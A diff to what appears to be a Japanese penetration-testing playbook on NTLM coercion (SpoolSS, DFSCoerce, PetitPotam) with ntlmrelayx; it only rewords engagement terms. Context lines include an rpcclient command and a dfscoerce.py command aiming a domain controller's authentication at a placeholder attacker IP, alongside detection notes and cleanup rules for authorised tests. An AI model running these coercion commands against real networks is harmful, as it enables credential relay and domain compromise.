@@ -93,7 +93,7 @@ rpcclient -U "[DOMAIN]/[USER]%[PASSWORD]" [TARGET_IP] -c "enumdrivers"
 | `rpc_s_access_denied` または `STATUS_ACCESS_DENIED` | 対象インターフェースが無効化・パッチ済み。別手法へ移行 |
 | 接続はするが ntlmrelayx に何も来ない | Coerce 呼び出しに指定した `[ATTACKER_IP]` と ntlmrelayx のリッスン IP が不一致の可能性。`ip a` で再確認 |
 | `SpoolSS` 関連エラー | Spooler サービスが停止している。DFSCoerce または PetitPotam へ移行 |
-| MDI アラートが上がった | 検知を前提に継続するかスコープ外とするかをクライアントと合意する |
+| MDI アラートが上がった | 検知を前提に継続するかスコープ外とするかを対象組織と合意する |
 
 ---
 
@@ -205,7 +205,7 @@ python3 dfscoerce.py -u [USER] -p [PASSWORD] -d [DOMAIN] [ATTACKER_IP] [TARGET_I
 - **想定されるSIEM/EDR検知**: MDI「Suspected DCE/RPC Exploitation Attempt」/ Event ID 5156・4768・4624 / ネットワーク NDR（DC からのアウトバウンド認証コールバック）
 - **業務影響リスク**: DC への RPC 呼び出しは通常の業務トラフィックには影響しないが、不安定な DC（高負荷・未パッチ環境）では予期しない影響が出る可能性がある。業務時間外の実施を推奨する
 - **原状回復必須項目**: Coerce 自体は設定変更を行わないため削除項目なし。組み合わせる ntlmrelayx 側の操作（Shadow Credentials / RBCD / マシンアカウント作成）の原状回復は `ntlmrelayx.md` を参照
-- **取得情報の取扱**: Coerce 経由で取得した認証情報・証明書・ハッシュは暗号化保管、案件終了後破棄
+- **取得情報の取扱**: Coerce 経由で取得した認証情報・証明書・ハッシュは暗号化保管、テスト完了後破棄
 - **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）
 
 ---
